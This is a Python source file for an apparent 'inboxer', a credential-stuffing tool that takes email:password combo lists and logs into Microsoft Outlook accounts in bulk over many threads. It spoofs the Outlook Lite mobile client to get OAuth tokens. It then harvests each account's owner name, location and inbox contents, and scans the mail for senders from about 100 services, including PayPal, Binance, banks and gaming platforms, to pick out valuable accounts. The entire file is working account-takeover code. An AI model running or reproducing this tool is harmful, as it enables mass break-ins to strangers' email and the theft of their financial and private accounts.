import re
import time
import random
import os
import uuid
import concurrent.futures
from typing import Dict, List, Optional, Callable
import requests

class InboxerEngine:
    """
    Improved inboxer engine with support for 100+ services including LIME, Shein, Temu.
    Supports keyword filtering and configurable threading.
    """

    SERVICE_EMAILS = {
        'Facebook': 'security@facebookmail.com',
        'Instagram': 'security@mail.instagram.com',
        'PUBG': 'noreply@pubgmobile.com',
        'Konami': 'nintendo-noreply@ccg.nintendo.com',
        'TikTok': 'register@account.tiktok.com',
        'Twitter': ['info@x.com', 'verify@x.com', 'verify@twitter.com', 'info@twitter.com'],
        'PayPal': ['service@paypal.com.br', 'noreply@mail.paypal.com', 'no-reply@paypal.com'],
        'Binance': ['do-not-reply@ses.binance.com', 'no-reply@binance.com'],
        'Netflix': 'info@account.netflix.com',
        'PlayStation': 'reply@txn-email.playstation.com',
        'Supercell': 'noreply@id.supercell.com',
        'Epic Games': 'help@acct.epicgames.com',
        'Spotify': ['no-reply@spotify.com', 'support@spotify.com'],
        'Rockstar': 'noreply@rockstargames.com',
        'Xbox': 'xboxreps@engage.xbox.com',
        'Microsoft': 'account-security-noreply@accountprotection.microsoft.com',
        'Steam': 'noreply@steampowered.com',
        'Roblox': 'accounts@roblox.com',
        'EA Sports': 'EA@e.ea.com',
        'Snapchat': 'no_reply@snapchat.com',
        'Discord': 'noreply@discord.com',
        'RiotGames': 'noreply@mail.accounts.riotgames.com',
        'OnlyFans': 'no-reply@onlyfans.com',
        'Pornhub': 'noreply@pornhub.com',
        'CallOfDuty': 'noreply@updates.activisio',
        'Crunchyroll': 'no-reply@crunchyroll.com',
        'Disney+': 'no-reply@disneyplus.com',
        'HBO Max': 'no-reply@hbomax.com',
        'Amazon': ['account-update@amazon.com', 'prime@amazon.com', 'music@amazon.com', 'video@amazon.com'],
        'DeutscheBahn': ['noreply@deutschebahn.com', 'noreply@bahn.de'],
        'Otto': ['service@otto.de', 'info@service.otto.de', 'service@info.otto.de'],
        'Apple': ['no_reply@email.apple.com', 'no-reply@apple.com', 'no-reply@tv.apple.com'],
        'LinkedIn': 'security-noreply@linkedin.com',
        'Shein2': 'Shein',
        'Skype': 'no-reply@skype.com',
        'Tegut': 'tebonus@tegut.com',
        'GitHub': 'noreply@github.com',
        'Dropbox': 'no-reply@dropbox.com',
        'Shopify': 'no-reply@shopify.com',
        'Patreon': 'no-reply@patreon.com',
        'Twitch': 'no-reply@twitch.tv',
        'Uber': 'noreply@uber.com',
        'Airbnb': 'express@airbnb.com',
        'Payoneer': 'noreply@payoneer.com',
        'NordVPN': 'noreply@nordvpn.com',
        'Decathlon': 'noreply@services.decathlon.de',
        'eBay': 'ebay@ebay.com',
        'Fraenk': ['noreply@fraenk.de', 'service@fraenk.de'],
        'Pandora': 'no-reply@pandora.com',
        'Salesforce': 'no-reply@salesforce.com',
        'SendGrid': 'no-reply@sendgrid.net',
        'Sky': 'no-reply@sky.com',
        'Sony': 'no-reply@sony.com',
        'Stripe': 'no-reply@stripe.com',
        'Zalando': ['no-reply@zalando.de', 'info@service-mail.zalando.de'],
        'Square': 'no-reply@square.com',
        'Square Enix': 'no-reply@square-enix.com',
        'Shadestation': 'no-reply@shadestation.co.uk',
        'Zoom': 'no-reply@zoom.us',
        'DoorDash': 'no-reply@doordash.com',
        'Grubhub': 'no-reply@grubhub.com',
        'Postmates': 'no-reply@postmates.com',
        'Wolt': 'Wolt',
        'PayPack': 'service@payback.de',
        'Adobe': 'no-reply@adobe.com',
        'AliExpress': 'no-reply@aliexpress.com',
        'KleinAnzeigen': ['noreply@mail.kleinanzeigen.de', 'noreply@kleinanzeigen.de'],
        'Audible': 'no-reply@audible.com',
        'Bank of America': 'no-reply@bankofamerica.com',
        'Basecamp': 'no-reply@basecamp.com',
        'Bestsecret': 'noreply@service.bestsecret.com',
        'Bitbucket': 'no-reply@bitbucket.org',
        'Blizzard': 'no-reply@blizzard.com',
        'Booking': 'no-reply@booking.com',
        'Check24': ['handytarife@check24.de', 'info@check24.de','Check24'],
        'Lieferando': 'no-reply@lieferando.de',
        'Kirolbet': 'clientes@kirolbet.es',
        'Cloudflare': 'no-reply@cloudflare.com',
        'Minecraft': 'premiumcloudcacheaccounts@odata.type',
        'LIME': 'No-reply@li.me',
        'Shein': 'noreply@sheinnotice.com',
        'Temu': 'temu@orders.temu.com',
    }

    def __init__(self, callback_func: Optional[Callable] = None):
        """
        Initialize the inboxer engine.

        Args:
            callback_func: Optional callback function for progress updates
        """
        self.callback_func = callback_func
        self.good_count = 0
        self.bad_count = 0
        self.checked_count = 0
        self.total_count = 0

    def check_service_in_inbox(self, inbox_text: str, service_keywords: Optional[List[str]] = None) -> List[str]:
        """
        Check which services are linked in the inbox.

        Args:
            inbox_text: The inbox data text
            service_keywords: Optional list of service keywords to filter (e.g., ['Facebook', 'Instagram'])

        Returns:
            List of found service names
        """
        found_services = []
        inbox_lower = inbox_text.lower()

        for service_name, emails in self.SERVICE_EMAILS.items():
            # Skip if filtering and service not in keywords
            if service_keywords and service_name.lower() not in [k.lower() for k in service_keywords]:
                continue

            # Check if email(s) exist in inbox (case-insensitive for better accuracy)
            if isinstance(emails, list):
                if any(email.lower() in inbox_lower for email in emails):
                    found_services.append(service_name)
            else:
                if emails.lower() in inbox_lower:
                    found_services.append(service_name)

        return found_services

    def get_profile_info(self, token: str, cid: str) -> Dict[str, str]:
        """Get user profile information from Microsoft."""
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()

            info_name = r.get('names', [])
            info_loca = r.get('accounts', [])

            name = info_name[0]['displayName'] if info_name else "Unknown"
            location = info_loca[0]['location'] if info_loca else "Unknown"

            return {"name": name, "location": location}
        except Exception as e:
            return {"name": "Unknown", "location": "Unknown"}

    def get_inbox_data(self, email: str, token: str, cid: str) -> Optional[str]:
        """Get inbox data from Outlook."""
        try:
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{cid}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0",
                "action": "StartupData",
                "x-owa-correlationid": f"{cid}",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "referer": "https://outlook.live.com/",
            }
            response = requests.post(url, headers=headers, data="", timeout=10)
            return response.text
        except Exception as e:
            return None

    def get_token(self, email: str, password: str, cookies: dict, headers: dict) -> Optional[str]:
        """Get access token from Microsoft OAuth."""
        try:
            code = headers.get('Location').split('code=')[1].split('&')[0]
            cid = cookies.get('MSPCID').upper()

            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token = response.json()["access_token"]
            return token, cid
        except Exception as e:
            return None, None

    def login_protocol(self, email: str, password: str, url: str, ppft: str, ad: str, 
                      cookies: dict, service_keywords: Optional[List[str]] = None) -> Dict:
        """
        Perform login and check inbox.

        Returns:
            Dict with status, email, password, services found, profile info
        """
        try:
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

            headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(len(login_data)),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"{ad}haschrome=1",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"
            }

            res = requests.post(url, data=login_data, headers=headers, allow_redirects=False, timeout=10)
            res_cookies = res.cookies.get_dict()
            res_headers = res.headers

            # Check if login successful
            if any(key in res_cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
                # Get token
                token, cid = self.get_token(email, password, res_cookies, res_headers)
                if token and cid:
                    # Get profile info
                    profile = self.get_profile_info(token, cid)

                    # Get inbox data
                    inbox_text = self.get_inbox_data(email, token, cid)
                    if inbox_text:
                        # Check services
                        services = self.check_service_in_inbox(inbox_text, service_keywords)

                        self.good_count += 1
                        return {
                            "status": "success",
                            "email": email,
                            "password": password,
                            "services": services,
                            "name": profile["name"],
                            "location": profile["location"]
                        }

            self.bad_count += 1
            return {"status": "failed", "email": email, "password": password}

        except Exception as e:
            self.bad_count += 1
            return {"status": "error", "email": email, "password": password, "error": str(e)}

    def get_values(self, email: str, password: str, service_keywords: Optional[List[str]] = None, 
                   max_retries: int = 3) -> Dict:
        """
        Get login values and perform check.

        Args:
            email: Email address
            password: Password
            service_keywords: Optional list of service keywords to filter
            max_retries: Maximum number of retry attempts

        Returns:
            Result dictionary
        """
        time.sleep(random.uniform(0.5, 2.0))

        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id": "false",
            "client-request-id": str(uuid.uuid4()),
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }

        retries = 0
        while retries < max_retries:
            try:
                email_clean = str(email).replace('"', '').replace("'", "")
                response = requests.get(
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email_clean +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
                    headers=headers,
                    timeout=10
                )

                if response.status_code == 429:
                    time.sleep(60)
                    retries += 1
                    continue

                cok = response.cookies.get_dict()

                # Extract URL
                match = re.search(r'"urlPost":"(.+?)"', response.text, re.S) or re.search(r"urlPost:'(.+?)'", response.text, re.S)
                url = match.group(1) if match else None

                # Extract PPFT
                match = re.search(r'value=\\\"(.+?)\\\"', response.text, re.S) or re.search(r'value="(.+?)"', response.text, re.S)
                ppft = match.group(1) if match else None

                ad = response.url.split('haschrome=1')[0]

                required_cookies = {
                    'MSPRequ': cok.get('MSPRequ'),
                    'uaid': cok.get('uaid'),
                    'RefreshTokenSso': cok.get('RefreshTokenSso'),
                    'MSPOK': cok.get('MSPOK'),
                    'OParams': cok.get('OParams')
                }

                # Check if all required values are present
                if None in [url, ppft] or None in required_cookies.values():
                    retries += 1
                    time.sleep(2)
                    continue

                # Perform login
                result = self.login_protocol(email, password, url, ppft, ad, required_cookies, service_keywords)
                self.checked_count += 1

                # Callback for progress
                if self.callback_func:
                    self.callback_func(self.checked_count, self.total_count, result)

                return result

            except Exception as e:
                retries += 1
                time.sleep(2)

        self.bad_count += 1
        self.checked_count += 1
        return {"status": "error", "email": email, "password": password, "error": "Max retries exceeded"}

    def process_combo_list(self, combo_list: List[str], threads: int = 0, 
                          service_keywords: Optional[List[str]] = None) -> List[Dict]:
        """
        Process a list of email:password combos.

        Args:
            combo_list: List of "email:password" strings
            threads: Number of concurrent threads (0 = auto-calculate based on account count)
            service_keywords: Optional list of service keywords to filter

        Returns:
            List of result dictionaries
        """
        # Auto-calculate optimal threads if not specified
        if threads <= 0:
            # Recommend threads based on account count
            # For small batches: 1 thread per account
            # For large batches: cap at reasonable limit to avoid system overload
            if len(combo_list) <= 50:
                threads = len(combo_list)
            elif len(combo_list) <= 200:
                threads = 100
            else:
                threads = min(200, len(combo_list) // 3)

        self.total_count = len(combo_list)
        self.checked_count = 0
        self.good_count = 0
        self.bad_count = 0

        results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []

            for combo in combo_list:
                try:
                    if ':' in combo:
                        parts = combo.strip().split(':', 1)
                        email = parts[0]
                        password = parts[1]
                        future = executor.submit(self.get_values, email, password, service_keywords)
                        futures.append(future)
                except Exception:
                    continue

            # Collect results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                except Exception:
                    continue

        return results
